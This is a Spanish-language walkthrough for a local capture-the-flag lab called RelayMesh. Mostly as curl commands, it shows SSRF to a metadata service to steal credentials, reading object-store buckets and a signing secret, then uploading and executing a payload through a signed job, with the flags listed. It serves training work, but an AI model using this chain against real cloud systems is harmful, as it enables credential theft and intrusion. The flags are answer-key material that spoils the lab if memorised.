# RelayMesh - Guia tecnica resumida

## 1. Arranque

```powershell
cd C:\Users\afvle\tfm\labs\relaymesh
docker compose up -d --build
```

Gateway: `http://127.0.0.1:8084`

ObjectStore: `http://127.0.0.1:8085`

## 2. SSRF hacia metadata

Probar desde el formulario del gateway o con curl:

```powershell
curl -X POST -d "url=http://metadata:5001/latest/meta-data/iam/security-credentials/" http://127.0.0.1:8084/relay/fetch
```

Debe aparecer el rol `relaymesh-waf-role`.

Despues:

```powershell
curl -X POST -d "url=http://metadata:5001/latest/meta-data/iam/security-credentials/relaymesh-waf-role" http://127.0.0.1:8084/relay/fetch
```

Extraer `AccessKeyId`, `SecretAccessKey` y `Token`.

## 3. Enumerar objectstore

```powershell
curl -H "X-RM-Access-Key: ASIARelayMeshAccess" -H "X-RM-Secret-Key: RelayMeshSecretKey2026" -H "X-RM-Session-Token: relaymesh-session-token-2026" http://127.0.0.1:8085/s3
```

Listar buckets interesantes:

```powershell
curl -H "X-RM-Access-Key: ASIARelayMeshAccess" -H "X-RM-Secret-Key: RelayMeshSecretKey2026" -H "X-RM-Session-Token: relaymesh-session-token-2026" http://127.0.0.1:8085/s3/rm-credit-app-archive
curl -H "X-RM-Access-Key: ASIARelayMeshAccess" -H "X-RM-Secret-Key: RelayMeshSecretKey2026" -H "X-RM-Session-Token: relaymesh-session-token-2026" http://127.0.0.1:8085/s3/rm-automation-secrets
```

Obtener user flag:

```powershell
curl -H "X-RM-Access-Key: ASIARelayMeshAccess" -H "X-RM-Secret-Key: RelayMeshSecretKey2026" -H "X-RM-Session-Token: relaymesh-session-token-2026" http://127.0.0.1:8085/s3/rm-credit-app-archive/proof/user.txt
```

## 4. Leer secreto de automatizacion

```powershell
curl -H "X-RM-Access-Key: ASIARelayMeshAccess" -H "X-RM-Secret-Key: RelayMeshSecretKey2026" -H "X-RM-Session-Token: relaymesh-session-token-2026" http://127.0.0.1:8085/s3/rm-automation-secrets/automation/job_signing_secret.txt
```

Resultado esperado: `RM_JOB_HMAC_2026`.

## 5. Subir extension

```powershell
@'
# relaymesh.extension
ACTION = "READ_ROOT_PROOF"
'@ | Set-Content -Encoding ascii relaymesh_payload.py

curl -X PUT -H "X-RM-Access-Key: ASIARelayMeshAccess" -H "X-RM-Secret-Key: RelayMeshSecretKey2026" -H "X-RM-Session-Token: relaymesh-session-token-2026" --data-binary "@relaymesh_payload.py" http://127.0.0.1:8085/s3/rm-extension-drop/extensions/relaymesh_payload.py
```

## 6. Firmar y enviar job

```powershell
$job="rm-final-001"
$sig = python -c "import hmac,hashlib; secret=b'RM_JOB_HMAC_2026'; msg=b'rm-final-001:rm-extension-drop:extensions/relaymesh_payload.py'; print(hmac.new(secret,msg,hashlib.sha256).hexdigest())"
$body = '{"job_id":"rm-final-001","bucket":"rm-extension-drop","key":"extensions/relaymesh_payload.py"}'
curl -X POST -H "Content-Type: application/json" -H "X-Job-Signature: $sig" -d $body http://127.0.0.1:8084/automation/jobs
```

## 7. Obtener root flag

```powershell
curl http://127.0.0.1:8084/automation/results/rm-final-001
```

Debe aparecer `DL{relaymesh_root_worker_extension}`.

## 8. Cierre

Abrir `http://127.0.0.1:8084/validate` y pegar:

- `DL{relaymesh_user_cloud_storage_access}`
- `DL{relaymesh_root_worker_extension}`

